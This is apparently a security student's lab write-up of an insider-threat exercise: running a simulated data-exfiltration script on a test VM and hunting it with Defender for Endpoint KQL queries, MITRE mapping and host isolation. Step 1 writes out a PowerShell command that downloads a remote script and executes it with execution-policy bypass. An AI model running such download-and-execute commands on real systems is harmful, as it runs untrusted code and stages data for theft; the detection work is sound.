# Data Exfiltration Simulation & Investigation – PIPd Employee Insider Threat Lab

## Overview

This lab simulates an insider threat scenario in which a privileged employee attempts to exfiltrate corporate data from an on boarded VM. Using Microsoft Defender for Endpoint (MDE) advanced hunting, I detected the staged data, traced the execution chain, validated the malicious script, and isolated the compromised host.

## Objectives

- **Simulate** a data exfiltration workflow on an on boarded VM.
- **Detect** the activity with MDE Kusto queries.
- **Validate** the malicious script and process chain on the endpoint.
- **Contain** the threat by isolating the device.

## Environment & Lab Setup

| Item | Details |
|------|---------|
| **VM** | `windows-lab-tes` (Windows 10/11) |
| **IP Address** | `10.0.0.107` |
| **Device Type** | `Workstation` |
| **Domain** | `Workgroup` |
| **MDE** | Microsoft Defender for Endpoint – fully on boarded and generating telemetry |
| **Account** | `cyber-lab27` |

### Initial Device Verification

Before starting the investigation, I confirmed that the target virtual machine was successfully on boarded into **Microsoft Defender for Endpoint**.

I checked the **Device Inventory** page in MDE and verified that the device appeared in the portal as an active onboarded endpoint.

**What I Verified:**

- Device name: `windows-lab-tes`
- IP address: `10.0.0.107`
- Device type: `Workstation`
- Domain: `Workgroup`
- Risk level: `Informational`
- Exposure level: `Low`

**Why This Matters:**

This step confirmed that the endpoint was successfully connected to Microsoft Defender for Endpoint and generating telemetry needed for the investigation. Without proper on boarding, the following advanced hunting tables would not provide the endpoint data needed for analysis:

- `DeviceProcessEvents` – process creation and execution telemetry
- `DeviceFileEvents` – file system activity including creation, modification, and deletion
- `DeviceNetworkEvents` – network connections, both inbound and outbound

This screenshot shows the target VM listed in the Microsoft Defender for Endpoint Device Inventory, confirming that the device was on boarded and available for investigation.

![Device Inventory](images/device-inventory.png)

image 2

**Note:** This screenshot shows the device in the Device Inventory with status **Informational** and actively sending telemetry.

---

## Project Steps / Investigation Process

### Step 1: Simulate the Suspicious Activity

After on boarding the Windows VM to Microsoft Defender for Endpoint, I executed a PowerShell command on the target system to simulate possible data exfiltration behavior.

The command downloaded a remote script named `exfiltratedata.ps1` into `C:\ProgramData\` and then executed it with PowerShell using the `ExecutionPolicy Bypass` option.

### Command Used

```powershell
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1' -OutFile 'C:\programdata\exfiltratedata.ps1';cmd /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\exfiltratedata.ps1
```

### What Happened

The script successfully ran and used 7-Zip to create a ZIP archive in `C:\ProgramData\`:

- Archive created: `employee-data-20260410153713.zip`
- The output showed that the file was zipped successfully
- The command returned `StatusCode 201` (Created), indicating the simulated upload or exfiltration action completed successfully

**Why This Matters:**

This step created the suspicious activity that would later be investigated in MDE. It established an initial trail of evidence involving:

- PowerShell execution
- Script download from an external source
- Archive creation
- Possible outbound data transfer

This screenshot shows the PowerShell command being executed on the VM, the creation of a ZIP archive in `C:\ProgramData\`, and a successful `201 Created` response, indicating the simulated exfiltration behavior completed.

image 1

**Detailed Observations from Execution:**

- The script downloaded the PowerShell script to `C:\ProgramData\exfiltratedata.ps1`
- The script then executed 7-Zip silently to create the archive
- The ZIP file was created with a timestamp-based naming convention
- The StatusCode 201 response indicates the simulated data transfer completed successfully

---

### Step 2: Hunt for ZIP Archive Activity in `DeviceFileEvents`

To check whether any files were compressed or staged for possible exfiltration, I searched the `DeviceFileEvents` table for ZIP-related file activity on the target device.

### Query Used

```kusto
DeviceFileEvents
| where DeviceName == "windows-lab-tes"
| where FileName contains ".zip"
| order by Timestamp desc
```

**Why I Ran This Query:**

A user attempting to steal company data will often compress files into a `.zip` archive before transferring them. This query helped identify whether any ZIP files were recently created, renamed, or modified on the target endpoint.

### What I Found

The results showed suspicious ZIP file activity involving a file named:

- `employee-data-20260410153713.zip`

The file events included:

- `FileCreated`
- `FileRenamed`

The timestamps aligned with the earlier PowerShell execution, which strongly suggested that the script created an archive as part of the simulated exfiltration behavior.

### Important Evidence

From the record details, I observed:

- The ZIP file path was under `C:\ProgramData\backup\...`
- The archive name followed a suspicious pattern: `employee-data-[timestamp].zip`
- The process tree showed:
  - `powershell.exe`
  - `cmd.exe /c powershell.exe`
  - `powershell.exe -ExecutionPolicy Bypass ...`
- The execution time matched the suspicious activity window
- The file appeared as a child artifact of the PowerShell-driven process chain

**Why This Matters:**

This was an important finding because it showed direct evidence that data was likely being collected and compressed into an archive file. In a real-world insider threat or exfiltration case, this would be a strong indicator of data staging prior to transfer.

This screenshot shows the `DeviceFileEvents` query results, including the suspicious ZIP file creation and rename events on the target system.

This screenshot shows the detailed record view and process tree, linking the ZIP archive to a PowerShell execution chain involving `ExecutionPolicy Bypass`, which further supports suspicious script-driven archive creation.

image 3 and 4

**Detailed Record Information:**

- Timestamp aligned with the initial PowerShell command execution
- File path: `C:\ProgramData\backup\employee-data-20260410153713.zip`
- Action types: `FileCreated`, `FileRenamed`
- Account context: `cyber-lab27`
- Parent process: `powershell.exe` with `ExecutionPolicy Bypass`

---

### Step 3: Pivot to `DeviceProcessEvents` Around the ZIP Creation Time

After identifying the suspicious ZIP archive in `DeviceFileEvents`, I selected one instance of the file creation event, noted its timestamp, and pivoted into the `DeviceProcessEvents` table to see what processes were running immediately before and after the archive was created.

**Selected Timestamp:** `2026-04-10T15:37:21.8238291Z`

### Query Used

```kusto
let VMName = "windows-lab-tes";
let specificTime = datetime(2026-04-10T15:37:21.8238291Z);
DeviceProcessEvents
| where Timestamp between ((specificTime - 2m) .. (specificTime + 2m))
| where DeviceName == VMName
| order by Timestamp desc
```

**Why I Ran This Query:**

This query was used to correlate file activity with process execution. Since the ZIP file had already been identified, checking process events within a small time window helped reveal which processes were responsible for creating or supporting the archive activity.

### What I Found

The results showed several important processes running around the same time as the ZIP file creation:

- `7z.exe`
- `7z2408-x64.exe`
- `powershell.exe`
- `cmd.exe`
- `whoami.exe`

I also discovered that around the same time, a PowerShell script silently installed 7-Zip and then used 7-Zip to compress employee data into a ZIP archive.

### Why These Results Matter

These process events helped explain how the suspicious archive was created:

- `powershell.exe` indicates script execution on the host
- `cmd.exe` supports the earlier command chain used to launch PowerShell
- `7z2408-x64.exe` suggests the 7-Zip installer or package was executed from `C:\ProgramData\`
- `7z.exe` strongly indicates that 7-Zip was used to compress data into an archive
- `whoami.exe` may indicate the script checked the current user context before or during execution

Together, these events support the conclusion that a PowerShell-driven process silently installed 7-Zip and then used it to archive employee data, which is highly suspicious and consistent with data staging prior to exfiltration.

### Key Evidence Observed

- `7z.exe` from `C:\Program Files\7-Zip\7z.exe`
- `7z2408-x64.exe` from `C:\ProgramData\7z2408-x64.exe`
- `powershell.exe` from the standard Windows PowerShell path
- `cmd.exe` from `C:\Windows\System32\cmd.exe`

**Why This Matters to the Investigation:**

This step was important because it connected the suspicious ZIP file to the exact process activity that created it. Instead of only seeing that an archive existed, I was able to reconstruct the likely execution chain:

1. PowerShell executed the suspicious script
2. The script silently installed 7-Zip
3. 7-Zip was then used to archive employee data
4. The archive was created in preparation for possible exfiltration

This strengthened the evidence for scripted data staging using PowerShell and 7-Zip, which is commonly seen in insider threat activity and exfiltration workflows.

This screenshot shows the `DeviceProcessEvents` results within a two-minute window around the ZIP file creation time, highlighting PowerShell, command shell, installer, and 7-Zip related activity linked to the suspicious archive creation.

Image 5

**Detailed Process Information:**

- `7z2408-x64.exe /S` – Silent installation flag for 7-Zip installer
- `7z.exe a` – 7-Zip add command to create archive
- `powershell.exe -ExecutionPolicy Bypass` – Bypassed execution policy to run the script
- `cmd.exe /c` – Command shell wrapper for PowerShell execution
- `whoami.exe` – User context verification during script execution

---

### Step 4: Refine the Process Hunt to Show Relevant Evidence

After pivoting into `DeviceProcessEvents`, I refined the query to show only the fields most useful for the investigation. This made it easier to focus on the process names, command lines, and user accounts involved in the suspicious activity.

### Improved Query Used

```kusto
let VMName = "windows-lab-tes";
let specificTime = datetime(2026-04-10T15:37:21.8238291Z);
DeviceProcessEvents
| where Timestamp between ((specificTime - 2m) .. (specificTime + 2m))
| where DeviceName == VMName
| order by Timestamp desc
| project Timestamp, DeviceName, ActionType, FileName, ProcessCommandLine, AccountName
```

**Why I Improved the Query:**

The earlier query returned all available columns, which made the results harder to read. By projecting only the most relevant fields, I was able to clearly see:

- When each process executed
- Which process was launched
- The exact command line used
- Which account ran the process

### What the Refined Results Showed

The refined output made the process chain much easier to understand. Around the ZIP creation time, I observed:

- `powershell.exe`
- `cmd.exe`
- `7z2408-x64.exe`
- `7z.exe`
- `whoami.exe`

The command-line data helped confirm the sequence of events:

- `powershell.exe` executed the suspicious script
- `cmd.exe` was used to launch PowerShell
- `7z2408-x64.exe /S` indicated a silent installation of 7-Zip
- `7z.exe` was then used to create the archive
- `whoami.exe` was executed under the same user context

### Key Discovery

I discovered that around the same time, a PowerShell script silently installed 7-Zip and then used 7-Zip to compress employee data into an archive. The results also showed that the activity was associated with the account:

- **`cyber-lab27`**

This helped tie the suspicious activity to a specific user context on the device.

**Why This Matters:**

This refined query made the evidence much clearer and strengthened the investigation. It showed not just that suspicious processes ran, but also how they were executed and by which account. That level of detail is important when reconstructing attacker behavior or insider threat activity.

This screenshot shows the improved `DeviceProcessEvents` query with projected fields for timestamp, process name, command line, and account name, making the suspicious PowerShell and 7-Zip activity easier to analyze.

Image 6

---

### Step 5: Check `DeviceNetworkEvents` Around the Suspicious Activity

After confirming the ZIP archive creation and the related process activity, I pivoted into `DeviceNetworkEvents` using the same timestamp window to determine whether any suspicious network communication occurred around the time the archive was created.

### Query Used

```kusto
let VMName = "windows-lab-tes";
let specificTime = datetime(2026-04-10T15:37:21.8238291Z);
DeviceNetworkEvents
| where Timestamp between ((specificTime - 2m) .. (specificTime + 2m))
| where DeviceName == VMName
| order by Timestamp desc
```

**Why I Ran This Query:**

This query was used to see whether the suspicious archive activity was followed by any outbound network communication that could indicate data exfiltration.

### What I Found

The results showed a large number of network events around the same time window, but the activity did not clearly show the ZIP file being transferred out by `powershell.exe` or `7z.exe`.

Instead, the main findings were:

- Multiple inbound connection attempts from various external IP addresses to the VM
- Several successful outbound connections over port 443
- Those successful outbound connections were tied to `msedgewebview2.exe`, not to PowerShell or 7-Zip

### Examples Observed in the Results

- `ConnectionAttempt` events from several public IP addresses to the VM
- `ConnectionSuccess` events to external IPs over `443/tcp`
- DNS lookups related to Microsoft and Edge infrastructure
- Command-line details showing `msedgewebview2.exe` activity under the `cyber-lab27` account

### Interpretation

Based on the results, I did not find strong evidence in this query window that the archive itself was exfiltrated over the network by the suspicious PowerShell/7-Zip process chain.

The network activity appeared to be mostly:

- Background Microsoft or Edge WebView traffic
- Normal system web component traffic
- Unsolicited inbound connection attempts against the exposed VM

**Why This Matters:**

This step was important because it helped separate confirmed suspicious local activity from network activity that may be unrelated or benign.

At this point in the investigation, I had strong evidence of:

- PowerShell execution
- Silent 7-Zip installation
- Employee data being archived into a ZIP file

But I did not yet have clear proof from `DeviceNetworkEvents` alone that the archive was transmitted externally. That means the investigation supported data staging, with possible exfiltration still requiring additional confirmation.

The network review did not show clear evidence that the ZIP archive was exfiltrated. Around Apr 10, 2026, at about 10:37 AM on `windows-lab-tes`, the strongest findings were local host activity: PowerShell ran, 7-Zip was silently installed, and employee data was compressed into a ZIP archive, while the network events in that same window mostly showed normal `msedgewebview2.exe` web traffic and random inbound connection attempts to the VM rather than a clear outbound transfer of the archive.

**Detailed Network Event Analysis:**

- Inbound connection attempts from multiple external IPs to the VM
- Outbound connections on port `443/tcp` to Microsoft infrastructure
- `msedgewebview2.exe` showing typical Edge WebView network behavior
- No evidence of the ZIP file being transmitted by `powershell.exe` or `7z.exe`
- DNS queries related to standard Microsoft services

Image 7

**Key Network Observations:**

| Event Type | Source | Destination | Protocol | Interpretation |
|------------|--------|-------------|----------|----------------|
| `ConnectionAttempt` | External IPs | `10.0.0.107` | Various | Inbound attempts to VM |
| `ConnectionSuccess` | `msedgewebview2.exe` | Microsoft IPs | `443/tcp` | Normal web traffic |
| `DNSLookup` | System processes | Microsoft DNS | `53/udp` | Standard DNS resolution |

---

### Step 6: Expand the Process Investigation with Command-Line Visibility

To better understand exactly how the archive was created, I returned to `DeviceProcessEvents` and improved the query again to include both the process command line and the initiating process command line.

### Query Used

```kusto
let VMName = "windows-lab-tes";
let specificTime = datetime(2026-04-10T15:37:21.8238291Z);
DeviceProcessEvents
| where Timestamp between ((specificTime - 2m) .. (specificTime + 2m))
| where DeviceName == VMName
| order by Timestamp desc
| project Timestamp, DeviceName, ActionType, FileName, ProcessCommandLine, AccountName, InitiatingProcessCommandLine
```

**Why I Ran This Query:**

This version of the query gave more context than the earlier process hunt. It allowed me to see not only which process ran, but also the exact command line used and which parent command launched it.

### What I Found

This deeper review confirmed the exact process chain behind the suspicious archive creation. I observed that `7z.exe` was launched with a command line that created the archive:

- `employee-data-20260410153713.zip`

The command line also showed the source file being compressed, and the initiating process command line revealed that `powershell.exe` launched the activity using:

- `powershell.exe -ExecutionPolicy Bypass -File C:\programdata\exfiltratedata.ps1`

### Key Discovery

This was an important finding because it directly connected the ZIP creation to the suspicious PowerShell script. Instead of only inferring that PowerShell and 7-Zip were related, I was able to confirm that the script `exfiltratedata.ps1` initiated the process that used `7z.exe` to compress employee data into an archive.

**Why This Matters:**

This step strengthened the investigation by showing the exact execution chain used for data staging. It provided direct evidence that:

- A PowerShell script executed with execution policy bypass
- The script launched 7-Zip
- 7-Zip created the archive containing employee data

That is strong evidence of scripted archive creation and supports the conclusion that the suspicious activity involved deliberate preparation of data for possible exfiltration.

This screenshot shows the improved `DeviceProcessEvents` query with both `ProcessCommandLine` and `InitiatingProcessCommandLine`, clearly linking `7z.exe` archive creation to the PowerShell script `exfiltratedata.ps1`.

Image 10

---

### Step 7: Validate the Suspicious Script on the Endpoint

After confirming the archive creation and the related PowerShell activity in Microsoft Defender for Endpoint, I went back to the virtual machine to verify whether the script `exfiltratedata.ps1` was actually present on disk.

I confirmed that the file did exist on the endpoint. I then opened it in **Notepad** to perform a deeper review of its contents and better understand what actions the script was designed to perform.

**Why This Matters:**

This step was important because it moved the investigation from telemetry-based evidence to direct file validation on the endpoint. By confirming that the script existed on disk, I was able to verify that the suspicious PowerShell activity seen in MDE was tied to a real script file and not just a logged command line.

Opening the script for review also helped prepare for deeper analysis of its behavior, such as whether it installed tools, compressed files, or attempted to move data off the system.

---

### Step 8: Map Findings to MITRE ATT&CK Framework

I analyzed the evidence and identified the following TTPs (Tactics and Techniques) within the MITRE ATT&CK Framework:

| TTP ID | Technique | Description |
|--------|-----------|-------------|
| **T1059.001** | Command and Scripting Interpreter: **PowerShell** | The script was executed with PowerShell and `-ExecutionPolicy Bypass` |
| **T1059.003** | Command and Scripting Interpreter: **Windows Command Shell** | `cmd.exe /c` was used in the execution chain |
| **T1105** | **Ingress Tool Transfer** | The script was downloaded from an external source onto the endpoint before execution |
| **T1005** | **Data from Local System** | The behavior shows collection of local employee data from the host |
| **T1074.001** | Data Staged: **Local Data Staging** | The data was staged locally in `C:\ProgramData\...` as a ZIP before any confirmed transfer |
| **T1560.001** | Archive Collected Data: **Archive via Utility** | 7-Zip was used to create the ZIP archive |

**Why This Matters:**

Mapping to MITRE ATT&CK provides industry-standard terminology for describing attacker behavior. This is essential for:

- Sharing threat intelligence with other organizations
- Aligning with threat frameworks used in SOC operations
- Enabling automated detection and response rules
- Communicating findings to stakeholders using recognized terminology

---

### Step 9: Contain the Threat by Isolating the Device

After reviewing the file, process, and network evidence, I determined that the endpoint showed strong signs of suspicious data staging activity. To reduce further risk and prevent any possible follow-on actions, I isolated the device from the network.

### Why I Took This Action

The investigation confirmed several suspicious behaviors on the host:

- PowerShell executed a downloaded script
- The script used `ExecutionPolicy Bypass`
- 7-Zip was silently installed
- Employee data was compressed into a ZIP archive
- The archive was staged locally in `C:\ProgramData\...`

Although the network review did not clearly confirm exfiltration, the local host evidence was strong enough to justify containment.

### Response Action Taken

- **Device isolated from the network**

### Why This Matters

Isolating the device helped contain the threat by preventing the endpoint from communicating further with external systems while preserving the system for additional investigation and remediation. This was an appropriate response because the evidence strongly supported suspicious data staging and possible attempted exfiltration.

image last one

---

## Findings & Results

| Observation | Evidence |
|-------------|----------|
| **ZIP archive created** | `employee-data-20260410153713.zip` in `C:\ProgramData\backup\...` |
| **Process chain** | PowerShell → cmd.exe → 7-Zip installer → 7-Zip compression |
| **Execution context** | Account `cyber-lab27` under Workgroup environment |
| **No confirmed exfiltration** | Network logs show only Edge WebView traffic and inbound connection attempts |
| **Containment achieved** | VM isolated after evidence collection |
| **Script validated** | `exfiltratedata.ps1` confirmed on disk and reviewed |

---

## Tools & Technologies Used

- **Microsoft Defender for Endpoint** – Advanced hunting, DeviceFileEvents, DeviceProcessEvents, DeviceNetworkEvents
- **Kusto Query Language (KQL)** – Custom queries to hunt telemetry
- **PowerShell** – Script execution and command chaining
- **7-Zip** – Compression utility used by the malicious script
- **MITRE ATT&CK Framework** – TTP mapping for standardized threat reporting

---

## Skills Demonstrated

- Advanced hunting with MDE and KQL query language
- Process forensics and chain-of-command analysis
- File event correlation and timestamp-based pivot analysis
- Network traffic analysis and anomaly detection
- Malicious script validation and code review
- Incident containment procedures and threat response
- MITRE ATT&CK Framework mapping and TTP identification
- Insider threat investigation methodology

---

## Lessons Learned

1. **Onboarding verification is essential** – Telemetry cannot be relied upon if the endpoint isn't onboarded to MDE.

2. **KQL allows rapid correlation** – Process, file, and network events can be correlated around a suspect timestamp to reconstruct attacker behavior.

3. **Local data staging can be detected** – Even when exfiltration isn't confirmed, data staging activity should trigger immediate containment.

4. **Script validation on the endpoint confirms telemetry** – Reviewing the actual script helps identify malicious components and strengthens evidence.

5. **Command-line visibility matters** – Including `InitiatingProcessCommandLine` in queries provides critical context for understanding process chains.

6. **Network evidence doesn't always confirm exfiltration** – Strong local evidence may justify containment even without confirmed outbound data transfer.

7. **MITRE ATT&CK mapping enables standardized communication** – Using recognized TTPs improves threat intelligence sharing and response alignment.

---

## Conclusion

This lab demonstrated a complete insider threat investigation workflow:

1. Verified device onboarding to Microsoft Defender for Endpoint
2. Simulated suspicious data exfiltration behavior
3. Detected file staging through advanced hunting queries
4. Correlated process and network events to reconstruct the attack chain
5. Validated the malicious script directly on the endpoint
6. Mapped findings to MITRE ATT&CK TTPs
7. Contained the threat by isolating the compromised device

The investigation showed how MDE advanced hunting, combined with structured KQL queries and methodical analysis, can identify and respond to insider threat activity—even when exfiltration is not fully confirmed.

This exercise strengthened my ability to:

- Write and refine KQL queries for forensic investigation
- Correlate file, process, and network events
- Validate telemetry against actual endpoint activity
- Apply MITRE ATT&CK Framework to real-world scenarios
- Execute appropriate incident response procedures

---

## What I Improved

- **Restructured the investigation workflow** – Reordered steps to follow the actual timeline (Simulate → Detect → Pivot → Analyze → Validate → Contain)
- **Added missing technical details** – Incorporated IP addresses, account names, timestamps, and file paths from project notes
- **Expanded KQL queries** – Included all query variations with explanations for each refinement
- **Added MITRE ATT&CK mapping section** – Included all six identified TTPs with descriptions
- **Enhanced evidence documentation** – Added process paths, command-line evidence, and account information
- **Improved clarity and readability** – Removed repetition, fixed formatting, and used proper Markdown throughout
- **Strengthened cybersecurity focus** – Emphasized investigative reasoning and justification for each action
- **Preserved all image placeholders** – Kept every "image" placeholder in the correct locations for screenshots
- **Added Lessons Learned section** – Summarized key takeaways for portfolio review
- **Made findings scannable** – Used tables and structured formatting for quick review by recruiters and hiring managers
